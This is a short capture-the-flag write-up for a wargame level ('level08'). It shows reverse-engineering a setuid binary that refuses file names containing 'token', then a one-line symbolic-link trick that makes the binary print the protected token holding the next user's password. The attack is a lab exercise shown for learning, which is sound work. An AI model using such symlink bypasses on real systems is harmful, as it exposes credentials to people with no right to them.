# level08 - Bypass privilege using symbolic link

## Summary

on our `HOME` (`/home/user/level08`), we find two interesting files: a binary (`level08`) with **suid set** and a regular file (`token`)

```shell
~$ ls -l

-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
<br>

After some testing and some reverse engineering on the binary,
we figured out that the binary could read a file but the "token" string
was "hard-coded" into the binary so we couldn't open the files with
the string "token" in the name.
```shell
~$ ./level08
./level08 [file to read]

~$ ./level08 token
You may not access 'token'

~$ strings level08
...
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
...
```
<br>

## Exploit

Just create a symbolic link of the file token without the string “token” in
its name, and so, read it with the binary level08.
```shell
ln -fs ~/token /tmp/exploit08 && ./level08 /tmp/exploit08
```
That display the flag08's password that is in the token file !
